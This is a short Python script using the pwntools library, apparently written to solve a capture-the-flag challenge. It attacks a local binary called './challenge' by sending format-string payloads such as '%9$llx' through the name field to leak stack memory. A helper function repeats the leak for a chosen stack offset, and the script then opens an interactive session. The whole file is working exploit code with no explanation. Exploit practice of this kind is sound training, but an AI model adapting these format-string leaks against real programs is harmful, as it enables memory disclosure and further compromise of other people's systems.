from pwn import *

e = ELF('./challenge')
p = process(e.path)

p.recvuntil(b'Name: ')
payload = b'A'*(31-6)+b'%9$llx'
p.send(payload)

def print_leak(leak):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Name: ')
    payload = b'A'*(31-6)+b'%'+str(leak).encode()+b'$llx'
    p.send(payload)
    p.recvuntil(b'> ')
    p.sendline(b'2')
    result = p.recvuntil(b'1. ').split(b'1. ')[0]
    if b'Name: ' in result:
        result = result.split(b' ')[1]

    result = result.decode()
    #convert the result to a string

    return result

print_leak(1)
p.recvuntil(b'> ')


p.interactive()
